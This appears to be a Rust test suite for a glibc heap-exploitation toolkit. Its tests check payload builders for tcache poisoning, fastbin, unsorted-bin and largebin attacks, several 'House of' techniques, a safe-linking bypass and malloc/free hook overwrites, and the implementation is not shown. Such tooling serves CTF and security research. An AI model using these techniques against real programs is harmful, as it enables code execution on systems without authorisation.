use talon::heap_tools::*;

// ═══════════════════════════════════════════════════════════════════════════
// HEAP CHUNK STRUCTURE TESTS
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn test_heap_chunk_creation() {
    let chunk = HeapChunk::new(0x80);
    assert_eq!(chunk.size, 0x80);
    assert_eq!(chunk.prev_size, 0);
    assert_eq!(chunk.data.len(), 0x80);
    assert!(chunk.fd.is_none());
    assert!(chunk.bk.is_none());
}

#[test]
fn test_heap_chunk_creation_various_sizes() {
    for size in [0x20, 0x40, 0x80, 0x100, 0x200, 0x400, 0x1000].iter() {
        let chunk = HeapChunk::new(*size);
        assert_eq!(chunk.size, *size);
        assert_eq!(chunk.data.len(), *size as usize);
    }
}

#[test]
fn test_heap_chunk_to_bytes() {
    let mut chunk = HeapChunk::new(0x80);
    chunk.prev_size = 0x100;
    chunk.size = 0x81; // With PREV_INUSE flag
    chunk.fd = Some(0xdeadbeef);
    chunk.bk = Some(0xcafebabe);
    
    let bytes = chunk.to_bytes();
    
    assert_eq!(&bytes[0..8], &0x100u64.to_le_bytes());
    assert_eq!(&bytes[8..16], &0x81u64.to_le_bytes());
    assert_eq!(&bytes[16..24], &0xdeadbeefu64.to_le_bytes());
    assert_eq!(&bytes[24..32], &0xcafebabeu64.to_le_bytes());
    assert!(bytes.len() >= 32 + 0x80);
}

#[test]
fn test_heap_chunk_to_bytes_no_pointers() {
    let chunk = HeapChunk::new(0x40);
    let bytes = chunk.to_bytes();
    
    assert_eq!(&bytes[0..8], &0u64.to_le_bytes());
    assert_eq!(&bytes[8..16], &0x40u64.to_le_bytes());
    assert_eq!(bytes.len(), 16 + 0x40);
}

#[test]
fn test_heap_chunk_size_flags() {
    let size = chunk_size(0x80, true, false, false);
    assert_eq!(size, 0x81); // PREV_INUSE
    
    let size = chunk_size(0x80, false, true, false);
    assert_eq!(size, 0x82); // IS_MMAPPED
    
    let size = chunk_size(0x80, false, false, true);
    assert_eq!(size, 0x84); // NON_MAIN_ARENA
    
    let size = chunk_size(0x80, true, true, true);
    assert_eq!(size, 0x87); // All flags
}

#[test]
fn test_heap_chunk_size_alignment() {
    let size = chunk_size(0x70, true, false, false);
    assert_eq!(size, 0x71);
    assert_eq!(size & 0x1, 0x1); // PREV_INUSE bit set
    assert_eq!(size & !0x7, 0x70); // Size is aligned
}

// ═══════════════════════════════════════════════════════════════════════════
// TCACHE ENTRY TESTS
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn test_tcache_entry_creation() {
    let entry = TcacheEntry::new(0xdeadbeef);
    assert_eq!(entry.next, 0xdeadbeef);
    assert_eq!(entry.key, 0);
}

#[test]
fn test_tcache_entry_to_bytes() {
    let entry = TcacheEntry::new(0x1234567890abcdef);
    let bytes = entry.to_bytes();
    
    assert_eq!(bytes.len(), 16);
    assert_eq!(&bytes[0..8], &0x1234567890abcdefu64.to_le_bytes());
    assert_eq!(&bytes[8..16], &0u64.to_le_bytes());
}

#[test]
fn test_tcache_entry_with_key() {
    let mut entry = TcacheEntry::new(0xdeadbeef);
    entry.key = 0xcafebabe;
    let bytes = entry.to_bytes();
    
    assert_eq!(&bytes[0..8], &0xdeadbeefu64.to_le_bytes());
    assert_eq!(&bytes[8..16], &0xcafebabeu64.to_le_bytes());
}

// ═══════════════════════════════════════════════════════════════════════════
// HEAP EXPLOIT BASIC TESTS
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn test_heap_exploit_creation() {
    let exploit = HeapExploit::new("./target_binary");
    assert_eq!(exploit.target_binary, "./target_binary");
    assert!(exploit.libc_base.is_none());
    assert!(exploit.heap_base.is_none());
}

#[test]
fn test_heap_exploit_set_bases() {
    let mut exploit = HeapExploit::new("./target");
    
    exploit.set_libc_base(0x7ffff7a00000);
    assert_eq!(exploit.libc_base, Some(0x7ffff7a00000));
    
    exploit.set_heap_base(0x555555554000);
    assert_eq!(exploit.heap_base, Some(0x555555554000));
}

// ═══════════════════════════════════════════════════════════════════════════
// TCACHE POISONING TESTS
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn test_tcache_poison_basic() {
    let exploit = HeapExploit::new("./target");
    let payload = exploit.tcache_poison(0x601000, 0x60);
    
    assert!(payload.len() >= 16);
    assert_eq!(&payload[0..8], &0x601000u64.to_le_bytes());
}

#[test]
fn test_tcache_poison_various_targets() {
    let exploit = HeapExploit::new("./target");
    
    let targets = [0x400000, 0x601000, 0x7ffff7dd2000, 0xdeadbeef];
    for target in targets.iter() {
        let payload = exploit.tcache_poison(*target, 0x80);
        assert_eq!(&payload[0..8], &target.to_le_bytes());
        assert_eq!(payload.len(), 0x80);
    }
}

#[test]
fn test_tcache_poison_size_padding() {
    let exploit = HeapExploit::new("./target");
    
    let payload = exploit.tcache_poison(0x601000, 0x100);
    assert_eq!(payload.len(), 0x100);
    
    let payload = exploit.tcache_poison(0x601000, 0x20);
    assert_eq!(payload.len(), 0x20);
}

#[test]
fn test_tcache_poison_quick_function() {
    let payload = tcache_poison(0x601000, 0x60);
    assert!(payload.len() >= 16);
    assert_eq!(&payload[0..8], &0x601000u64.to_le_bytes());
}

// ═══════════════════════════════════════════════════════════════════════════
// FASTBIN ATTACK TESTS
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn test_fastbin_attack_basic() {
    let exploit = HeapExploit::new("./target");
    let payload = exploit.fastbin_attack(0x601000, 0x60);
    
    assert!(payload.len() >= 8);
    assert_eq!(&payload[0..8], &0x601000u64.to_le_bytes());
}

#[test]
fn test_fastbin_attack_various_targets() {
    let exploit = HeapExploit::new("./target");
    
    let targets = [0x400000, 0x601000, 0x7ffff7dd2000];
    for target in targets.iter() {
        let payload = exploit.fastbin_attack(*target, 0x40);
        assert_eq!(&payload[0..8], &target.to_le_bytes());
        assert_eq!(payload.len(), 0x40);
    }
}

#[test]
fn test_fastbin_attack_quick_function() {
    let payload = fastbin_attack(0x601000, 0x40);
    assert_eq!(&payload[0..8], &0x601000u64.to_le_bytes());
    assert_eq!(payload.len(), 0x40);
}

// ═══════════════════════════════════════════════════════════════════════════
// UNSORTED BIN ATTACK TESTS
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn test_unsorted_bin_attack() {
    let exploit = HeapExploit::new("./target");
    let payload = exploit.unsorted_bin_attack(0x601020);
    
    assert!(payload.len() > 0);
    
    let bk_offset = 24;
    let bk_value = u64::from_le_bytes(payload[bk_offset..bk_offset+8].try_into().unwrap());
    assert_eq!(bk_value, 0x601020u64.wrapping_sub(0x10));
}

#[test]
fn test_unsorted_bin_attack_various_targets() {
    let exploit = HeapExploit::new("./target");
    
    let targets = [0x601020, 0x7ffff7dd2010, 0x555555554020];
    for target in targets.iter() {
        let payload = exploit.unsorted_bin_attack(*target);
        let bk_offset = 24;
        let bk_value = u64::from_le_bytes(payload[bk_offset..bk_offset+8].try_into().unwrap());
        assert_eq!(bk_value, target.wrapping_sub(0x10));
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// HOUSE OF FORCE TESTS
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn test_house_of_force() {
    let exploit = HeapExploit::new("./target");
    let payload = exploit.house_of_force(0x601000);
    
    assert!(payload.len() >= 8);
    assert_eq!(&payload[0..8], &0xFFFFFFFFFFFFFFFFu64.to_le_bytes());
}

#[test]
fn test_house_of_force_top_chunk_corruption() {
    let exploit = HeapExploit::new("./target");
    let payload = exploit.house_of_force(0x7ffff7dd2000);
    
    let corrupted_size = u64::from_le_bytes(payload[0..8].try_into().unwrap());
    assert_eq!(corrupted_size, u64::MAX);
}

// ═══════════════════════════════════════════════════════════════════════════
// HOUSE OF SPIRIT TESTS
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn test_house_of_spirit() {
    let exploit = HeapExploit::new("./target");
    let payload = exploit.house_of_spirit(0x7fffffffe000, 0x80);
    
    assert!(payload.len() >= 32);
    
    let size = u64::from_le_bytes(payload[8..16].try_into().unwrap());
    assert_eq!(size & 0x1, 0x1); // PREV_INUSE flag set
    assert_eq!(size & !0xF, 0x80); // Size field
}

#[test]
fn test_house_of_spirit_next_chunk() {
    let exploit = HeapExploit::new("./target");
    let payload = exploit.house_of_spirit(0x7fffffffe000, 0x80);
    
    let fake_chunk_end = 16 + 0x80;
    let next_chunk_size = u64::from_le_bytes(
        payload[fake_chunk_end+8..fake_chunk_end+16].try_into().unwrap()
    );
    assert_eq!(next_chunk_size, 0x80 + 0x10);
}

// ═══════════════════════════════════════════════════════════════════════════
// SAFE-LINKING TESTS (GLIBC 2.32+)
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn test_safe_linking_bypass() {
    let exploit = HeapExploit::new("./target");
    let chunk_addr = 0x555555554290;
    let target_addr = 0x555555554500;
    
    let payload = exploit.safe_linking_bypass(chunk_addr, target_addr);
    
    assert_eq!(payload.len(), 8);
    
    let expected_mangled = target_addr ^ (chunk_addr >> 12);
    let actual_mangled = u64::from_le_bytes(payload.as_slice().try_into().unwrap());
    assert_eq!(actual_mangled, expected_mangled);
}

#[test]
fn test_safe_linking_mangle_demangle() {
    let chunk_addr = 0x555555554290u64;
    let target_addr = 0x555555554500u64;
    
    let mangled = target_addr ^ (chunk_addr >> 12);
    let demangled = mangled ^ (chunk_addr >> 12);
    
    assert_eq!(demangled, target_addr);
}

#[test]
fn test_safe_linking_various_addresses() {
    let exploit = HeapExploit::new("./target");
    
    let test_cases = [
        (0x555555554000, 0x555555554100),
        (0x7ffff7a00000, 0x7ffff7a00200),
        (0x123456789000, 0x123456789500),
    ];
    
    for (chunk, target) in test_cases.iter() {
        let payload = exploit.safe_linking_bypass(*chunk, *target);
        let mangled = u64::from_le_bytes(payload.as_slice().try_into().unwrap());
        
        let demangled = mangled ^ (chunk >> 12);
        assert_eq!(demangled, *target);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// HOOK OFFSET TESTS
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn test_malloc_hook_offset() {
    let exploit = HeapExploit::new("./target");
    let offset = exploit.malloc_hook_offset();
    assert!(offset > 0);
    assert!(offset < 0x10000000); // Reasonable libc offset
}

#[test]
fn test_free_hook_offset() {
    let exploit = HeapExploit::new("./target");
    let offset = exploit.free_hook_offset();
    assert!(offset > 0);
    assert!(offset < 0x10000000);
}

#[test]
fn test_system_offset() {
    let exploit = HeapExploit::new("./target");
    let offset = exploit.system_offset();
    assert!(offset > 0);
    assert!(offset < 0x10000000);
}

#[test]
fn test_hook_offsets_different() {
    let exploit = HeapExploit::new("./target");
    let malloc_hook = exploit.malloc_hook_offset();
    let free_hook = exploit.free_hook_offset();
    let system = exploit.system_offset();
    
    assert_ne!(malloc_hook, free_hook);
    assert_ne!(malloc_hook, system);
    assert_ne!(free_hook, system);
}

// ═══════════════════════════════════════════════════════════════════════════
// TCACHE TO MALLOC_HOOK EXPLOIT CHAIN TESTS
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn test_tcache_to_malloc_hook_no_libc_base() {
    let exploit = HeapExploit::new("./target");
    let result = exploit.tcache_to_malloc_hook(0x12345);
    assert!(result.is_err());
    assert!(result.unwrap_err().contains("Libc base not set"));
}

#[test]
fn test_tcache_to_malloc_hook_success() {
    let mut exploit = HeapExploit::new("./target");
    exploit.set_libc_base(0x7ffff7a00000);
    
    let one_gadget = 0x7ffff7a4f3d5;
    let result = exploit.tcache_to_malloc_hook(one_gadget);
    
    assert!(result.is_ok());
    let chain = result.unwrap();
    assert!(chain.len() > 0);
}

#[test]
fn test_tcache_to_malloc_hook_payload_structure() {
    let mut exploit = HeapExploit::new("./target");
    exploit.set_libc_base(0x7ffff7a00000);
    
    let one_gadget = 0x7ffff7a4f3d5;
    let chain = exploit.tcache_to_malloc_hook(one_gadget).unwrap();
    
    assert!(chain.len() >= 0x60 * 2 + 8);
    
    let one_gadget_offset = 0x60 * 2;
    let embedded_gadget = u64::from_le_bytes(
        chain[one_gadget_offset..one_gadget_offset+8].try_into().unwrap()
    );
    assert_eq!(embedded_gadget, one_gadget);
}

// ═══════════════════════════════════════════════════════════════════════════
// ONE-GADGET TESTS
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn test_one_gadget_offsets() {
    let gadgets = one_gadget_offsets();
    assert!(gadgets.len() >= 3);
    
    for gadget in gadgets.iter() {
        assert!(*gadget > 0);
        assert!(*gadget < 0x10000000);
    }
}

#[test]
fn test_one_gadget_offsets_unique() {
    let gadgets = one_gadget_offsets();
    for i in 0..gadgets.len() {
        for j in i+1..gadgets.len() {
            assert_ne!(gadgets[i], gadgets[j]);
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// GLIBC VERSION TESTS
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn test_glibc_version_from_string() {
    assert_eq!(GlibcVersion::from_string("2.23").unwrap(), GlibcVersion::V223);
    assert_eq!(GlibcVersion::from_string("2.27").unwrap(), GlibcVersion::V227);
    assert_eq!(GlibcVersion::from_string("2.31").unwrap(), GlibcVersion::V231);
    assert_eq!(GlibcVersion::from_string("2.32").unwrap(), GlibcVersion::V232);
    assert_eq!(GlibcVersion::from_string("2.35").unwrap(), GlibcVersion::V235);
    assert_eq!(GlibcVersion::from_string("2.39").unwrap(), GlibcVersion::V239);
}

#[test]
fn test_glibc_version_invalid() {
    assert!(GlibcVersion::from_string("1.0").is_err());
    assert!(GlibcVersion::from_string("3.0").is_err());
    assert!(GlibcVersion::from_string("2.99").is_err());
    assert!(GlibcVersion::from_string("invalid").is_err());
}

#[test]
fn test_glibc_version_has_safe_linking() {
    assert!(!GlibcVersion::V223.has_safe_linking());
    assert!(!GlibcVersion::V227.has_safe_linking());
    assert!(!GlibcVersion::V231.has_safe_linking());
    assert!(GlibcVersion::V232.has_safe_linking());
    assert!(GlibcVersion::V235.has_safe_linking());
    assert!(GlibcVersion::V239.has_safe_linking());
}

#[test]
fn test_glibc_version_has_tcache_key() {
    assert!(!GlibcVersion::V223.has_tcache_key());
    assert!(!GlibcVersion::V227.has_tcache_key());
    assert!(!GlibcVersion::V231.has_tcache_key());
    assert!(!GlibcVersion::V232.has_tcache_key());
    assert!(GlibcVersion::V235.has_tcache_key());
    assert!(GlibcVersion::V239.has_tcache_key());
}

// ═══════════════════════════════════════════════════════════════════════════
// MODERN HEAP EXPLOIT FRAMEWORK TESTS
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn test_modern_heap_exploit_creation() {
    let exploit = ModernHeapExploit::new("./target", GlibcVersion::V235);
    assert_eq!(exploit.binary, "./target");
    assert_eq!(exploit.glibc_version, GlibcVersion::V235);
    assert!(exploit.heap_base.is_none());
    assert!(exploit.libc_base.is_none());
}

#[test]
fn test_modern_heap_exploit_set_bases() {
    let mut exploit = ModernHeapExploit::new("./target", GlibcVersion::V235);
    
    exploit.set_heap_base(0x555555554000);
    assert_eq!(exploit.heap_base, Some(0x555555554000));
    
    exploit.set_libc_base(0x7ffff7a00000);
    assert_eq!(exploit.libc_base, Some(0x7ffff7a00000));
}

#[test]
fn test_modern_heap_exploit_set_technique() {
    let mut exploit = ModernHeapExploit::new("./target", GlibcVersion::V235);
    
    exploit.set_technique(HeapTechnique::TcachePoisoningSafeLinking);
    assert_eq!(exploit.technique, HeapTechnique::TcachePoisoningSafeLinking);
    
    exploit.set_technique(HeapTechnique::HouseOfIO);
    assert_eq!(exploit.technique, HeapTechnique::HouseOfIO);
}

#[test]
fn test_modern_heap_exploit_set_target() {
    let mut exploit = ModernHeapExploit::new("./target", GlibcVersion::V235);
    
    exploit.set_target(HeapTarget::MallocHook);
    assert_eq!(exploit.target, HeapTarget::MallocHook);
    
    exploit.set_target(HeapTarget::FreeHook);
    assert_eq!(exploit.target, HeapTarget::FreeHook);
}

#[test]
fn test_modern_heap_exploit_set_overwrite_value() {
    let mut exploit = ModernHeapExploit::new("./target", GlibcVersion::V235);
    
    exploit.set_overwrite_value(0xdeadbeef);
    assert_eq!(exploit.overwrite_value, 0xdeadbeef);
}

// ═══════════════════════════════════════════════════════════════════════════
// TCACHE SAFE-LINKING EXPLOIT TESTS
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn test_solve_tcache_safe_linking_no_safe_linking() {
    let mut exploit = ModernHeapExploit::new("./target", GlibcVersion::V231);
    exploit.set_technique(HeapTechnique::TcachePoisoningSafeLinking);
    exploit.set_heap_base(0x555555554000);
    exploit.set_libc_base(0x7ffff7a00000);
    exploit.set_overwrite_value(0xdeadbeef);
    
    let result = exploit.solve();
    assert!(result.is_err());
    assert!(result.unwrap_err().contains("Safe-linking not present"));
}

#[test]
fn test_solve_tcache_safe_linking_no_heap_base() {
    let mut exploit = ModernHeapExploit::new("./target", GlibcVersion::V235);
    exploit.set_technique(HeapTechnique::TcachePoisoningSafeLinking);
    exploit.set_libc_base(0x7ffff7a00000);
    exploit.set_overwrite_value(0xdeadbeef);
    
    let result = exploit.solve();
    assert!(result.is_err());
    assert!(result.unwrap_err().contains("Heap base required"));
}

#[test]
fn test_solve_tcache_safe_linking_success() {
    let mut exploit = ModernHeapExploit::new("./target", GlibcVersion::V235);
    exploit.set_technique(HeapTechnique::TcachePoisoningSafeLinking);
    exploit.set_heap_base(0x555555554000);
    exploit.set_libc_base(0x7ffff7a00000);
    exploit.set_target(HeapTarget::FreeHook);
    exploit.set_overwrite_value(0xdeadbeef);
    
    let result = exploit.solve();
    assert!(result.is_ok());
    
    let exploit_result = result.unwrap();
    assert_eq!(exploit_result.technique, "Tcache Poisoning + Safe-Linking Bypass");
    assert!(exploit_result.payload_bytes.len() >= 8);
    assert!(exploit_result.success_probability > 0.8);
    assert!(exploit_result.steps.len() >= 4);
}

#[test]
fn test_solve_tcache_safe_linking_with_key() {
    let mut exploit = ModernHeapExploit::new("./target", GlibcVersion::V235);
    exploit.set_technique(HeapTechnique::TcachePoisoningSafeLinking);
    exploit.set_heap_base(0x555555554000);
    exploit.set_libc_base(0x7ffff7a00000);
    exploit.set_target(HeapTarget::MallocHook);
    exploit.set_overwrite_value(0xcafebabe);
    
    let result = exploit.solve().unwrap();
    
    assert!(result.payload_bytes.len() >= 16);
}

// ═══════════════════════════════════════════════════════════════════════════
// TCACHE KEY BYPASS TESTS
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn test_solve_tcache_key_bypass_no_tcache_key() {
    let mut exploit = ModernHeapExploit::new("./target", GlibcVersion::V232);
    exploit.set_technique(HeapTechnique::TcachePoisoningKeyBypass);
    exploit.set_heap_base(0x555555554000);
    exploit.set_libc_base(0x7ffff7a00000);
    
    let result = exploit.solve();
    assert!(result.is_err());
    assert!(result.unwrap_err().contains("Tcache key validation not present"));
}

#[test]
fn test_solve_tcache_key_bypass_success() {
    let mut exploit = ModernHeapExploit::new("./target", GlibcVersion::V235);
    exploit.set_technique(HeapTechnique::TcachePoisoningKeyBypass);
    exploit.set_heap_base(0x555555554000);
    exploit.set_libc_base(0x7ffff7a00000);
    exploit.set_target(HeapTarget::FreeHook);
    exploit.set_overwrite_value(0xdeadbeef);
    
    let result = exploit.solve();
    assert!(result.is_ok());
    
    let exploit_result = result.unwrap();
    assert_eq!(exploit_result.technique, "Tcache Key Validation Bypass");
    assert_eq!(exploit_result.payload_bytes.len(), 16);
    assert!(exploit_result.success_probability > 0.8);
}

// ═══════════════════════════════════════════════════════════════════════════
// HOUSE OF IO TESTS
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn test_solve_house_of_io_no_libc_base() {
    let mut exploit = ModernHeapExploit::new("./target", GlibcVersion::V235);
    exploit.set_technique(HeapTechnique::HouseOfIO);
    
    let result = exploit.solve();
    assert!(result.is_err());
    assert!(result.unwrap_err().contains("Libc base required"));
}

#[test]
fn test_solve_house_of_io_success() {
    let mut exploit = ModernHeapExploit::new("./target", GlibcVersion::V235);
    exploit.set_technique(HeapTechnique::HouseOfIO);
    exploit.set_libc_base(0x7ffff7a00000);
    exploit.set_overwrite_value(0x7ffff7a50d60);
    
    let result = exploit.solve();
    assert!(result.is_ok());
    
    let exploit_result = result.unwrap();
    assert_eq!(exploit_result.technique, "House of IO (FILE Exploitation)");
    assert!(exploit_result.payload_bytes.len() > 0);
    assert!(exploit_result.steps.len() >= 6);
}

// ═══════════════════════════════════════════════════════════════════════════
// HOUSE OF APPLE TESTS
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn test_solve_house_of_apple_no_bases() {
    let mut exploit = ModernHeapExploit::new("./target", GlibcVersion::V235);
    exploit.set_technique(HeapTechnique::HouseOfApple);
    
    let result = exploit.solve();
    assert!(result.is_err());
}

#[test]
fn test_solve_house_of_apple_success() {
    let mut exploit = ModernHeapExploit::new("./target", GlibcVersion::V235);
    exploit.set_technique(HeapTechnique::HouseOfApple);
    exploit.set_heap_base(0x555555554000);
    exploit.set_libc_base(0x7ffff7a00000);
    exploit.set_overwrite_value(0x7ffff7a50d60);
    
    let result = exploit.solve();
    assert!(result.is_ok());
    
    let exploit_result = result.unwrap();
    assert_eq!(exploit_result.technique, "House of Apple (_IO_wfile_overflow)");
    assert!(exploit_result.payload_bytes.len() > 0);
    assert!(exploit_result.steps.len() >= 6);
    assert!(exploit_result.constraints.len() >= 4);
}

// ═══════════════════════════════════════════════════════════════════════════
// LARGEBIN ATTACK TESTS
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn test_solve_largebin_attack_no_heap_base() {
    let mut exploit = ModernHeapExploit::new("./target", GlibcVersion::V235);
    exploit.set_technique(HeapTechnique::LargebinAttack);
    exploit.set_libc_base(0x7ffff7a00000);
    exploit.set_target(HeapTarget::Arbitrary(0x601000));
    
    let result = exploit.solve();
    assert!(result.is_err());
}

#[test]
fn test_solve_largebin_attack_success() {
    let mut exploit = ModernHeapExploit::new("./target", GlibcVersion::V235);
    exploit.set_technique(HeapTechnique::LargebinAttack);
    exploit.set_heap_base(0x555555554000);
    exploit.set_libc_base(0x7ffff7a00000);
    exploit.set_target(HeapTarget::Arbitrary(0x601020));
    
    let result = exploit.solve();
    assert!(result.is_ok());
    
    let exploit_result = result.unwrap();
    assert_eq!(exploit_result.technique, "Largebin Attack");
    assert!(exploit_result.payload_bytes.len() >= 16);
    assert!(exploit_result.steps.len() >= 5);
}

#[test]
fn test_solve_largebin_attack_payload_structure() {
    let mut exploit = ModernHeapExploit::new("./target", GlibcVersion::V235);
    exploit.set_technique(HeapTechnique::LargebinAttack);
    exploit.set_heap_base(0x555555554000);
    exploit.set_libc_base(0x7ffff7a00000);
    exploit.set_target(HeapTarget::Arbitrary(0x601020));
    
    let result = exploit.solve().unwrap();
    
    let size = u64::from_le_bytes(result.payload_bytes[8..16].try_into().unwrap());
    assert_eq!(size, 0x421);
}

// ═══════════════════════════════════════════════════════════════════════════
// BASIC TCACHE POISONING TESTS
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn test_solve_tcache_basic_success() {
    let mut exploit = ModernHeapExploit::new("./target", GlibcVersion::V231);
    exploit.set_technique(HeapTechnique::TcachePoisoning);
    exploit.set_libc_base(0x7ffff7a00000);
    exploit.set_target(HeapTarget::MallocHook);
    exploit.set_overwrite_value(0xdeadbeef);
    
    let result = exploit.solve();
    assert!(result.is_ok());
    
    let exploit_result = result.unwrap();
    assert_eq!(exploit_result.technique, "Basic Tcache Poisoning");
    assert!(exploit_result.success_probability >= 0.9);
}

// ═══════════════════════════════════════════════════════════════════════════
// TARGET ADDRESS RESOLUTION TESTS
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn test_get_target_address_malloc_hook() {
    let mut exploit = ModernHeapExploit::new("./target", GlibcVersion::V235);
    exploit.set_libc_base(0x7ffff7a00000);
    exploit.set_target(HeapTarget::MallocHook);
    
    let result = exploit.solve();
    assert!(result.is_ok());
    
    let exploit_result = result.unwrap();
    assert!(exploit_result.target_address > 0x7ffff7a00000);
    assert!(exploit_result.target_address < 0x7ffff7c00000);
}

#[test]
fn test_get_target_address_free_hook() {
    let mut exploit = ModernHeapExploit::new("./target", GlibcVersion::V235);
    exploit.set_libc_base(0x7ffff7a00000);
    exploit.set_target(HeapTarget::FreeHook);
    exploit.set_technique(HeapTechnique::TcachePoisoningSafeLinking);
    exploit.set_heap_base(0x555555554000);
    exploit.set_overwrite_value(0xdeadbeef);
    
    let result = exploit.solve().unwrap();
    assert!(result.target_address > 0x7ffff7a00000);
}

#[test]
fn test_get_target_address_arbitrary() {
    let mut exploit = ModernHeapExploit::new("./target", GlibcVersion::V235);
    exploit.set_heap_base(0x555555554000);
    exploit.set_target(HeapTarget::Arbitrary(0xdeadbeef));
    exploit.set_technique(HeapTechnique::LargebinAttack);
    
    let result = exploit.solve().unwrap();
    assert_eq!(result.target_address, 0xdeadbeef);
}

// ═══════════════════════════════════════════════════════════════════════════
// SERIALIZATION TESTS
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn test_heap_exploit_result_serialization() {
    let result = HeapExploitResult {
        technique: "Test Technique".to_string(),
        glibc_version: "2.35".to_string(),
        payload_bytes: vec![0x41, 0x42, 0x43, 0x44],
        payload_size: 4,
        target_address: 0x601000,
        overwrite_value: 0xdeadbeef,
        steps: vec!["Step 1".to_string(), "Step 2".to_string()],
        success_probability: 0.9,
        constraints: vec!["Constraint 1".to_string()],
    };
    
    let json = serde_json::to_string(&result);
    assert!(json.is_ok());
}

#[test]
fn test_heap_exploit_result_deserialization() {
    let json = r#"{
        "technique": "Test",
        "glibc_version": "2.35",
        "payload_bytes": [65, 66, 67, 68],
        "payload_size": 4,
        "target_address": 6295552,
        "overwrite_value": 3735928559,
        "steps": ["Step 1"],
        "success_probability": 0.9,
        "constraints": ["C1"]
    }"#;
    
    let result: Result<HeapExploitResult, _> = serde_json::from_str(json);
    assert!(result.is_ok());
    
    let exploit_result = result.unwrap();
    assert_eq!(exploit_result.technique, "Test");
    assert_eq!(exploit_result.payload_bytes, vec![65, 66, 67, 68]);
}

// ═══════════════════════════════════════════════════════════════════════════
// INTEGRATION TESTS - FULL EXPLOIT CHAINS
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn test_full_exploit_chain_glibc_223() {
    let mut exploit = ModernHeapExploit::new("./target", GlibcVersion::V223);
    exploit.set_libc_base(0x7ffff7a00000);
    exploit.set_technique(HeapTechnique::TcachePoisoning);
    exploit.set_target(HeapTarget::MallocHook);
    exploit.set_overwrite_value(0x7ffff7a4f3d5);
    
    let result = exploit.solve();
    assert!(result.is_ok());
}

#[test]
fn test_full_exploit_chain_glibc_235() {
    let mut exploit = ModernHeapExploit::new("./target", GlibcVersion::V235);
    exploit.set_heap_base(0x555555554000);
    exploit.set_libc_base(0x7ffff7a00000);
    exploit.set_technique(HeapTechnique::TcachePoisoningSafeLinking);
    exploit.set_target(HeapTarget::FreeHook);
    exploit.set_overwrite_value(0x7ffff7a50d60);
    
    let result = exploit.solve();
    assert!(result.is_ok());
    
    let exploit_result = result.unwrap();
    assert!(exploit_result.constraints.len() > 0);
    assert!(exploit_result.success_probability > 0.0);
}

#[test]
fn test_full_exploit_chain_glibc_239() {
    let mut exploit = ModernHeapExploit::new("./target", GlibcVersion::V239);
    exploit.set_heap_base(0x555555554000);
    exploit.set_libc_base(0x7ffff7a00000);
    exploit.set_technique(HeapTechnique::HouseOfApple);
    exploit.set_overwrite_value(0x7ffff7a50d60);
    
    let result = exploit.solve();
    assert!(result.is_ok());
}
